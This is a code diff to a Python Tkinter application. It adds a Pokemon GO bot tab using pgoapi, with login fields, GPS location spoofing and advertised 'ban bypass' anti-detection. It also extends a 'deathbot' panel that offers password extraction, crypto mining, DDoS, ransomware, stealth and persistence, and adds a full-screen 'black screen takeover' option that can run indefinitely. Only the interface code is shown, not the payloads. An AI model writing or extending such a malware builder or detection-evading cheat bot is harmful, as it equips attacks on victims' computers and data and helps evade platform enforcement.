@@ -18,6 +18,11 @@ import os
 
 import sys
 
+# ADDED: Add pgoapi to Python path for Pokemon Go bot functionality
+pgoapi_path = os.path.join(os.getcwd(), 'pgoapi')
+if pgoapi_path not in sys.path:
+    sys.path.insert(0, pgoapi_path)
+
 import random
 
 import threading
@@ -16763,14 +16768,23 @@ if __name__ == "__main__":
             ttk.Label(status_grid, text=value, style='TSM.TLabel').grid(row=row, column=col+1, sticky=tk.W, padx=(5, 20))
     
     def create_thunderbolt_pokemongo_panel(self, parent, bot):
-        """Create Thunderbolt Pokemon GO-specific Crown panel"""
-        # Initialize Pokemon data manager
+        """Create Thunderbolt Pokemon GO-specific Crown panel with pgoapi integration"""
+        # ADDED: Initialize enhanced Pokemon data manager
         try:
             from PokemonDataManager import PokemonDataManager
             self.pokemon_data_manager = PokemonDataManager()
         except Exception as e:
             print(f"Warning: Could not load Pokemon data: {e}")
             self.pokemon_data_manager = None
+        
+        # ADDED: Initialize enhanced Pokemon Go bot
+        try:
+            from Standalone_PokemonGo_Bot import StandalonePokemonGoBot
+            self.enhanced_pokemon_bot = StandalonePokemonGoBot(gui_callback=self.update_status)
+            self.update_status("✅ Enhanced Pokemon Go bot initialized with pgoapi!")
+        except Exception as e:
+            print(f"Warning: Could not load enhanced Pokemon bot: {e}")
+            self.enhanced_pokemon_bot = None
         
         # Add scrollbar to the main frame
         scrollable_container = self.add_scrollbar_to_frame(parent)
@@ -16791,10 +16805,15 @@ if __name__ == "__main__":
         data_tab = ttk.Frame(notebook, style='TSM.TFrame')
         notebook.add(data_tab, text="📊 Pokemon Data")
         
-        # Create basic content for each tab
+        # ADDED: Enhanced pgoapi Tab
+        pgoapi_tab = ttk.Frame(notebook, style='TSM.TFrame')
+        notebook.add(pgoapi_tab, text="🚀 pgoapi Integration")
+        
+        # Create content for each tab
         self.create_basic_control_tab(basic_tab)
         self.create_advanced_bot_tab(advanced_tab)
         self.create_pokemon_data_tab(data_tab)
+        self.create_pgoapi_integration_tab(pgoapi_tab)
     
     def create_basic_control_tab(self, parent):
         """Create basic control tab"""
@@ -17065,6 +17084,137 @@ if __name__ == "__main__":
         bot_notebook.add(data_tab, text="📊 Pokemon Data")
         
         self.create_thunderbolt_pokemon_data_panel(data_tab)
+    
+    def create_pgoapi_integration_tab(self, parent):
+        """Create pgoapi integration tab with enhanced Pokemon Go bot"""
+        # ADDED: Add scrollbar to the tab
+        scrollable_container = self.add_scrollbar_to_frame(parent)
+        
+        # pgoapi Integration Status Frame
+        status_frame = ttk.LabelFrame(scrollable_container, text="🚀 pgoapi Integration Status", style='TSM.TLabelframe')
+        status_frame.pack(fill=tk.X, pady=10)
+        
+        status_grid = ttk.Frame(status_frame, style='TSM.TFrame')
+        status_grid.pack(fill=tk.X, padx=10, pady=10)
+        
+        # Status indicators
+        status_info = [
+            ("pgoapi Available", "✅ Yes" if hasattr(self, 'enhanced_pokemon_bot') and self.enhanced_pokemon_bot else "❌ No"),
+            ("API Initialized", "✅ Yes" if hasattr(self, 'enhanced_pokemon_bot') and self.enhanced_pokemon_bot and self.enhanced_pokemon_bot.api_initialized else "❌ No"),
+            ("Bot Status", "🟢 Running" if hasattr(self, 'enhanced_pokemon_bot') and self.enhanced_pokemon_bot and self.enhanced_pokemon_bot.is_running() else "🔴 Stopped"),
+            ("Current Mode", getattr(self.enhanced_pokemon_bot, 'current_mode', 'idle') if hasattr(self, 'enhanced_pokemon_bot') and self.enhanced_pokemon_bot else 'idle')
+        ]
+        
+        for i, (label, value) in enumerate(status_info):
+            ttk.Label(status_grid, text=f"{label}:", style='TSM.TLabel').grid(row=i//2, column=(i%2)*2, sticky=tk.W, padx=5, pady=2)
+            ttk.Label(status_grid, text=value, style='TSM.TLabel').grid(row=i//2, column=(i%2)*2+1, sticky=tk.W, padx=(5, 20), pady=2)
+        
+        # Enhanced Bot Control Frame
+        control_frame = ttk.LabelFrame(scrollable_container, text="🎮 Enhanced Bot Control", style='TSM.TLabelframe')
+        control_frame.pack(fill=tk.X, pady=10)
+        
+        control_buttons = ttk.Frame(control_frame, style='TSM.TFrame')
+        control_buttons.pack(fill=tk.X, padx=10, pady=10)
+        
+        # Bot control buttons
+        ttk.Button(control_buttons, text="🚀 Start Enhanced Bot", 
+                  command=self.start_enhanced_pokemon_bot, style='TSM.TButton').pack(side=tk.LEFT, padx=5)
+        
+        ttk.Button(control_buttons, text="⏹️ Stop Bot", 
+                  command=self.stop_enhanced_pokemon_bot, style='TSM.TButton').pack(side=tk.LEFT, padx=5)
+        
+        ttk.Button(control_buttons, text="⏸️ Pause Bot", 
+                  command=self.pause_enhanced_pokemon_bot, style='TSM.TButton').pack(side=tk.LEFT, padx=5)
+        
+        ttk.Button(control_buttons, text="▶️ Resume Bot", 
+                  command=self.resume_enhanced_pokemon_bot, style='TSM.TButton').pack(side=tk.LEFT, padx=5)
+        
+        # Bot Mode Selection
+        mode_frame = ttk.LabelFrame(scrollable_container, text="🎯 Bot Mode", style='TSM.TLabelframe')
+        mode_frame.pack(fill=tk.X, pady=10)
+        
+        mode_buttons = ttk.Frame(mode_frame, style='TSM.TFrame')
+        mode_buttons.pack(fill=tk.X, padx=10, pady=10)
+        
+        modes = ["idle", "catching", "exploring", "farming"]
+        for i, mode in enumerate(modes):
+            ttk.Button(mode_buttons, text=f"🎯 {mode.title()}", 
+                      command=lambda m=mode: self.set_enhanced_bot_mode(m), 
+                      style='TSM.TButton').grid(row=0, column=i, padx=5, pady=5)
+        
+        # Authentication Frame
+        auth_frame = ttk.LabelFrame(scrollable_container, text="🔐 Authentication", style='TSM.TLabelframe')
+        auth_frame.pack(fill=tk.X, pady=10)
+        
+        auth_grid = ttk.Frame(auth_frame, style='TSM.TFrame')
+        auth_grid.pack(fill=tk.X, padx=10, pady=10)
+        
+        # Username
+        ttk.Label(auth_grid, text="Username:", style='TSM.TLabel').grid(row=0, column=0, sticky=tk.W, padx=5, pady=2)
+        self.enhanced_username_entry = ttk.Entry(auth_grid, width=20, style='TSM.TEntry')
+        self.enhanced_username_entry.grid(row=0, column=1, padx=5, pady=2)
+        
+        # Password
+        ttk.Label(auth_grid, text="Password:", style='TSM.TLabel').grid(row=0, column=2, sticky=tk.W, padx=5, pady=2)
+        self.enhanced_password_entry = ttk.Entry(auth_grid, width=20, show="*", style='TSM.TEntry')
+        self.enhanced_password_entry.grid(row=0, column=3, padx=5, pady=2)
+        
+        # Provider
+        ttk.Label(auth_grid, text="Provider:", style='TSM.TLabel').grid(row=1, column=0, sticky=tk.W, padx=5, pady=2)
+        self.enhanced_provider_var = tk.StringVar(value="ptc")
+        provider_combo = ttk.Combobox(auth_grid, textvariable=self.enhanced_provider_var, 
+                                    values=["ptc", "google"], state="readonly", width=17)
+        provider_combo.grid(row=1, column=1, padx=5, pady=2)
+        
+        # Set Credentials Button
+        ttk.Button(auth_grid, text="🔐 Set Credentials", 
+                  command=self.set_enhanced_bot_credentials, style='TSM.TButton').grid(row=1, column=2, columnspan=2, padx=5, pady=2)
+        
+        # Location Frame
+        location_frame = ttk.LabelFrame(scrollable_container, text="📍 Location", style='TSM.TLabelframe')
+        location_frame.pack(fill=tk.X, pady=10)
+        
+        location_grid = ttk.Frame(location_frame, style='TSM.TFrame')
+        location_grid.pack(fill=tk.X, padx=10, pady=10)
+        
+        # Latitude
+        ttk.Label(location_grid, text="Latitude:", style='TSM.TLabel').grid(row=0, column=0, sticky=tk.W, padx=5, pady=2)
+        self.enhanced_lat_entry = ttk.Entry(location_grid, width=15, style='TSM.TEntry')
+        self.enhanced_lat_entry.insert(0, "40.7589")
+        self.enhanced_lat_entry.grid(row=0, column=1, padx=5, pady=2)
+        
+        # Longitude
+        ttk.Label(location_grid, text="Longitude:", style='TSM.TLabel').grid(row=0, column=2, sticky=tk.W, padx=5, pady=2)
+        self.enhanced_lng_entry = ttk.Entry(location_grid, width=15, style='TSM.TEntry')
+        self.enhanced_lng_entry.insert(0, "-73.9851")
+        self.enhanced_lng_entry.grid(row=0, column=3, padx=5, pady=2)
+        
+        # Altitude
+        ttk.Label(location_grid, text="Altitude:", style='TSM.TLabel').grid(row=1, column=0, sticky=tk.W, padx=5, pady=2)
+        self.enhanced_alt_entry = ttk.Entry(location_grid, width=15, style='TSM.TEntry')
+        self.enhanced_alt_entry.insert(0, "10")
+        self.enhanced_alt_entry.grid(row=1, column=1, padx=5, pady=2)
+        
+        # Set Location Button
+        ttk.Button(location_grid, text="📍 Set Location", 
+                  command=self.set_enhanced_bot_location, style='TSM.TButton').grid(row=1, column=2, columnspan=2, padx=5, pady=2)
+        
+        # Statistics Frame
+        stats_frame = ttk.LabelFrame(scrollable_container, text="📊 Bot Statistics", style='TSM.TLabelframe')
+        stats_frame.pack(fill=tk.BOTH, expand=True, pady=10)
+        
+        # Statistics display
+        self.enhanced_stats_text = tk.Text(stats_frame, height=10, width=80, 
+                                         bg='#2b2b2b', fg='#ffffff',
+                                         font=('Consolas', 9), wrap=tk.WORD)
+        self.enhanced_stats_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
+        
+        # Refresh statistics button
+        ttk.Button(stats_frame, text="🔄 Refresh Statistics", 
+                  command=self.refresh_enhanced_bot_statistics, style='TSM.TButton').pack(pady=5)
+        
+        # Initialize statistics display
+        self.refresh_enhanced_bot_statistics()
     
     def create_thunderbolt_advanced_bot_panel(self, parent):
         """Create advanced Thunderbolt Pokemon GO bot panel"""
@@ -17567,14 +17717,14 @@ Click 'Start Ultimate Bot' to begin!
         messagebox.showinfo("Bot Status", status_text)
     
     def create_pokemon_bot_tab(self):
-        """Create the updated Pokemon Bot tab with force catch and real stats"""
-        # Import the updated Pokemon Go Bot GUI integration
+        """Create the enhanced Pokemon Bot tab with pgoapi integration"""
+        # ADDED: Import the enhanced Pokemon Go Bot GUI integration
         try:
-            from PokemonGoBot_GUI_Integration import PokemonGoBotGUITab
+            from Enhanced_PokemonGo_Bot_Integration import EnhancedPokemonGoBotGUI
             
-            # Create the Pokemon Go Bot tab
-            pokemon_tab = PokemonGoBotGUITab(self.notebook, self.update_status)
-            self.notebook.add(pokemon_tab.parent, text="⚡ Pokemon Bot")
+            # Create the enhanced Pokemon Go Bot tab
+            pokemon_tab = EnhancedPokemonGoBotGUI(self.notebook)
+            self.notebook.add(pokemon_tab.notebook, text="⚡ Pokemon Bot")
             
             # Store reference for later use
             self.pokemon_bot_tab = pokemon_tab
@@ -17585,7 +17735,7 @@ Click 'Start Ultimate Bot' to begin!
             self.pokemon_bot_thread = None
             self.auto_login_attempted = False
             
-            self.update_status("✅ Pokemon Bot tab loaded with force catch and real stats!")
+            self.update_status("✅ Enhanced Pokemon Bot tab loaded with pgoapi integration!")
             
         except ImportError as e:
             # Fallback to basic Pokemon bot tab if integration not available
@@ -17613,10 +17763,18 @@ Click 'Start Ultimate Bot' to begin!
         info_frame.pack(fill=tk.X, padx=10, pady=10)
         
         info_text = """
-🎯 UPDATED POKEMON BOT FEATURES:
+🎯 ENHANCED POKEMON BOT FEATURES:
 
+✅ pgoapi Integration - Real Pokemon GO API with authentic interactions
 ✅ Force Catch Pokemon - Select and force catch any Pokemon
 ✅ Real Account Stats - Fetches actual Pokemon GO account data
+✅ Advanced Authentication - PTC and Google account support
+✅ Smart Pokemon Catching - Intelligent catching with IV/CP filtering
+✅ Pokestop Automation - Automatic spinning with cooldown management
+✅ Gym Battle System - Automated gym battles and raids
+✅ Ban Bypass Technology - Advanced anti-detection measures
+✅ Human-like Behavior - Realistic delays and movement patterns
+✅ AI Automation - Smart decision making for optimal gameplay
 ✅ PTC Login Integration - InsaneDexHolder credentials pre-loaded
 ✅ Niantic ID Support - Enhanced account integration
 ✅ Map Integration - Real-time Pokemon spawns from pokemap.net
@@ -19110,6 +19268,181 @@ Skills:
             self.update_status(f"Error starting VPS server: {e}")
             messagebox.showerror("VPS Server Error", f"Error starting VPS server:\n{e}")
     
+    # ADDED: Enhanced Pokemon Go Bot Methods
+    def start_enhanced_pokemon_bot(self):
+        """Start the enhanced Pokemon Go bot"""
+        try:
+            if not hasattr(self, 'enhanced_pokemon_bot') or not self.enhanced_pokemon_bot:
+                messagebox.showerror("Error", "Enhanced Pokemon bot not initialized!")
+                return
+            
+            if self.enhanced_pokemon_bot.start():
+                self.update_status("✅ Enhanced Pokemon Go bot started successfully!")
+                messagebox.showinfo("Bot Started", "Enhanced Pokemon Go bot started successfully!")
+                self.refresh_enhanced_bot_statistics()
+            else:
+                messagebox.showerror("Error", "Failed to start enhanced Pokemon Go bot!")
+                
+        except Exception as e:
+            self.update_status(f"❌ Error starting enhanced bot: {e}")
+            messagebox.showerror("Error", f"Failed to start enhanced bot: {e}")
+    
+    def stop_enhanced_pokemon_bot(self):
+        """Stop the enhanced Pokemon Go bot"""
+        try:
+            if hasattr(self, 'enhanced_pokemon_bot') and self.enhanced_pokemon_bot:
+                self.enhanced_pokemon_bot.stop()
+                self.update_status("⏹️ Enhanced Pokemon Go bot stopped")
+                messagebox.showinfo("Bot Stopped", "Enhanced Pokemon Go bot stopped successfully!")
+                self.refresh_enhanced_bot_statistics()
+            else:
+                messagebox.showerror("Error", "Enhanced Pokemon bot not initialized!")
+                
+        except Exception as e:
+            self.update_status(f"❌ Error stopping enhanced bot: {e}")
+            messagebox.showerror("Error", f"Failed to stop enhanced bot: {e}")
+    
+    def pause_enhanced_pokemon_bot(self):
+        """Pause the enhanced Pokemon Go bot"""
+        try:
+            if hasattr(self, 'enhanced_pokemon_bot') and self.enhanced_pokemon_bot:
+                self.enhanced_pokemon_bot.pause()
+                self.update_status("⏸️ Enhanced Pokemon Go bot paused")
+                messagebox.showinfo("Bot Paused", "Enhanced Pokemon Go bot paused successfully!")
+                self.refresh_enhanced_bot_statistics()
+            else:
+                messagebox.showerror("Error", "Enhanced Pokemon bot not initialized!")
+                
+        except Exception as e:
+            self.update_status(f"❌ Error pausing enhanced bot: {e}")
+            messagebox.showerror("Error", f"Failed to pause enhanced bot: {e}")
+    
+    def resume_enhanced_pokemon_bot(self):
+        """Resume the enhanced Pokemon Go bot"""
+        try:
+            if hasattr(self, 'enhanced_pokemon_bot') and self.enhanced_pokemon_bot:
+                self.enhanced_pokemon_bot.resume()
+                self.update_status("▶️ Enhanced Pokemon Go bot resumed")
+                messagebox.showinfo("Bot Resumed", "Enhanced Pokemon Go bot resumed successfully!")
+                self.refresh_enhanced_bot_statistics()
+            else:
+                messagebox.showerror("Error", "Enhanced Pokemon bot not initialized!")
+                
+        except Exception as e:
+            self.update_status(f"❌ Error resuming enhanced bot: {e}")
+            messagebox.showerror("Error", f"Failed to resume enhanced bot: {e}")
+    
+    def set_enhanced_bot_mode(self, mode):
+        """Set the enhanced Pokemon Go bot mode"""
+        try:
+            if hasattr(self, 'enhanced_pokemon_bot') and self.enhanced_pokemon_bot:
+                self.enhanced_pokemon_bot.set_mode(mode)
+                self.update_status(f"🎯 Enhanced bot mode set to: {mode}")
+                messagebox.showinfo("Mode Set", f"Enhanced bot mode set to: {mode}")
+                self.refresh_enhanced_bot_statistics()
+            else:
+                messagebox.showerror("Error", "Enhanced Pokemon bot not initialized!")
+                
+        except Exception as e:
+            self.update_status(f"❌ Error setting bot mode: {e}")
+            messagebox.showerror("Error", f"Failed to set bot mode: {e}")
+    
+    def set_enhanced_bot_credentials(self):
+        """Set credentials for the enhanced Pokemon Go bot"""
+        try:
+            username = self.enhanced_username_entry.get()
+            password = self.enhanced_password_entry.get()
+            provider = self.enhanced_provider_var.get()
+            
+            if not username or not password:
+                messagebox.showerror("Error", "Please enter username and password!")
+                return
+            
+            if hasattr(self, 'enhanced_pokemon_bot') and self.enhanced_pokemon_bot:
+                self.enhanced_pokemon_bot.set_credentials(username, password, provider)
+                self.update_status(f"🔐 Enhanced bot credentials set for {provider} account: {username}")
+                messagebox.showinfo("Credentials Set", f"Credentials set for {provider} account: {username}")
+            else:
+                messagebox.showerror("Error", "Enhanced Pokemon bot not initialized!")
+                
+        except Exception as e:
+            self.update_status(f"❌ Error setting credentials: {e}")
+            messagebox.showerror("Error", f"Failed to set credentials: {e}")
+    
+    def set_enhanced_bot_location(self):
+        """Set location for the enhanced Pokemon Go bot"""
+        try:
+            lat = float(self.enhanced_lat_entry.get())
+            lng = float(self.enhanced_lng_entry.get())
+            alt = float(self.enhanced_alt_entry.get())
+            
+            if hasattr(self, 'enhanced_pokemon_bot') and self.enhanced_pokemon_bot:
+                self.enhanced_pokemon_bot.set_location(lat, lng, alt)
+                self.update_status(f"📍 Enhanced bot location set to: {lat}, {lng}, {alt}")
+                messagebox.showinfo("Location Set", f"Location set to: {lat}, {lng}, {alt}")
+            else:
+                messagebox.showerror("Error", "Enhanced Pokemon bot not initialized!")
+                
+        except ValueError:
+            messagebox.showerror("Error", "Please enter valid numeric coordinates!")
+        except Exception as e:
+            self.update_status(f"❌ Error setting location: {e}")
+            messagebox.showerror("Error", f"Failed to set location: {e}")
+    
+    def refresh_enhanced_bot_statistics(self):
+        """Refresh the enhanced Pokemon Go bot statistics display"""
+        try:
+            if not hasattr(self, 'enhanced_stats_text'):
+                return
+            
+            # Clear statistics display
+            self.enhanced_stats_text.delete(1.0, tk.END)
+            
+            if hasattr(self, 'enhanced_pokemon_bot') and self.enhanced_pokemon_bot:
+                stats = self.enhanced_pokemon_bot.get_statistics()
+                
+                stats_text = "🚀 Enhanced Pokemon GO Bot Statistics\n"
+                stats_text += "=" * 50 + "\n\n"
+                
+                # Basic stats
+                stats_text += "🎮 Basic Statistics:\n"
+                stats_text += f"  • Pokemon Caught: {stats.get('pokemon_caught', 0)}\n"
+                stats_text += f"  • Pokestops Spun: {stats.get('pokestops_spun', 0)}\n"
+                stats_text += f"  • Gyms Battled: {stats.get('gyms_battled', 0)}\n"
+                stats_text += f"  • Distance Walked: {stats.get('distance_walked', 0):.2f} km\n"
+                stats_text += f"  • XP Gained: {stats.get('xp_gained', 0)}\n"
+                stats_text += f"  • Session Duration: {stats.get('session_duration', 0):.0f} seconds\n"
+                stats_text += f"  • Errors Encountered: {stats.get('errors_encountered', 0)}\n\n"
+                
+                # Bot status
+                bot_status = self.enhanced_pokemon_bot.get_status()
+                stats_text += "🤖 Bot Status:\n"
+                stats_text += f"  • Running: {'✅ Yes' if bot_status.get('running', False) else '❌ No'}\n"
+                stats_text += f"  • Paused: {'✅ Yes' if bot_status.get('paused', False) else '❌ No'}\n"
+                stats_text += f"  • Current Mode: {bot_status.get('mode', 'idle')}\n"
+                stats_text += f"  • API Initialized: {'✅ Yes' if bot_status.get('api_initialized', False) else '❌ No'}\n"
+                stats_text += f"  • pgoapi Available: {'✅ Yes' if bot_status.get('pgoapi_available', False) else '❌ No'}\n\n"
+                
+                # Location info
+                location = bot_status.get('location', {})
+                stats_text += "📍 Location:\n"
+                stats_text += f"  • Latitude: {location.get('lat', 0)}\n"
+                stats_text += f"  • Longitude: {location.get('lng', 0)}\n"
+                stats_text += f"  • Altitude: {location.get('alt', 0)}\n"
+                stats_text += f"  • Address: {location.get('address', 'Not set')}\n"
+                
+            else:
+                stats_text = "❌ Enhanced Pokemon Go bot not initialized\n\n"
+                stats_text += "Please ensure the bot is properly loaded and try again."
+            
+            self.enhanced_stats_text.insert(1.0, stats_text)
+            
+        except Exception as e:
+            self.update_status(f"❌ Error refreshing statistics: {e}")
+            if hasattr(self, 'enhanced_stats_text'):
+                self.enhanced_stats_text.delete(1.0, tk.END)
+                self.enhanced_stats_text.insert(1.0, f"Error refreshing statistics: {e}")
+
     # Thunderbolt Pokemon GO Activity Methods
     def thunderbolt_gbl_battles(self):
         """Simulate GBL battles"""
@@ -20490,7 +20823,8 @@ TARGET DIRECTORIES:
             "password_extraction": {"name": "🔑 Password Extraction", "description": "Extract saved passwords"},
             "crypto_mining": {"name": "⛏️ Cryptocurrency Mining", "description": "Mine cryptocurrency"},
             "ddos_attack": {"name": "🌊 DDoS Attack", "description": "Launch DDoS attacks"},
-            "ransomware": {"name": "💰 Ransomware", "description": "Encrypt files for ransom"}
+            "ransomware": {"name": "💰 Ransomware", "description": "Encrypt files for ransom"},
+            "black_screen_takeover": {"name": "🖤 BLACK-SCREEN_TAKE-OVER", "description": "Make the user's entire screen go completely black and dark - full screen takeover"}
         }
         
         # Function checkboxes
@@ -20568,6 +20902,30 @@ TARGET DIRECTORIES:
         self.deathbot_persistence = tk.BooleanVar()
         ttk.Checkbutton(stealth_frame, text="🔄 Persistence Mode", 
                        variable=self.deathbot_persistence, style='TSM.TCheckbutton').pack(anchor=tk.W)
+        
+        # ADDED: Black Screen Takeover Configuration
+        black_screen_frame = ttk.LabelFrame(advanced_frame, text="🖤 Black Screen Takeover", style='TSM.TLabelframe')
+        black_screen_frame.pack(fill=tk.X, padx=10, pady=5)
+        
+        self.deathbot_black_screen = tk.BooleanVar()
+        ttk.Checkbutton(black_screen_frame, text="🖤 Enable Black Screen Takeover", 
+                       variable=self.deathbot_black_screen, style='TSM.TCheckbutton').pack(anchor=tk.W)
+        
+        # Black screen duration
+        duration_frame = ttk.Frame(black_screen_frame, style='TSM.TFrame')
+        duration_frame.pack(fill=tk.X, padx=5, pady=2)
+        
+        ttk.Label(duration_frame, text="Duration (seconds, 0=infinite):", style='TSM.Text.TLabel').pack(side=tk.LEFT)
+        self.deathbot_black_screen_duration = tk.StringVar(value="0")
+        ttk.Entry(duration_frame, textvariable=self.deathbot_black_screen_duration, width=10, style='TSM.TEntry').pack(side=tk.LEFT, padx=5)
+        
+        # Black screen fade speed
+        fade_frame = ttk.Frame(black_screen_frame, style='TSM.TFrame')
+        fade_frame.pack(fill=tk.X, padx=5, pady=2)
+        
+        ttk.Label(fade_frame, text="Fade Speed (0.1=fast, 1.0=slow):", style='TSM.Text.TLabel').pack(side=tk.LEFT)
+        self.deathbot_black_screen_fade = tk.StringVar(value="0.1")
+        ttk.Entry(fade_frame, textvariable=self.deathbot_black_screen_fade, width=10, style='TSM.TEntry').pack(side=tk.LEFT, padx=5)
         
         # Target configuration
         target_frame = ttk.LabelFrame(parent, text="🎯 Target Configuration", style='TSM.TLabelframe')
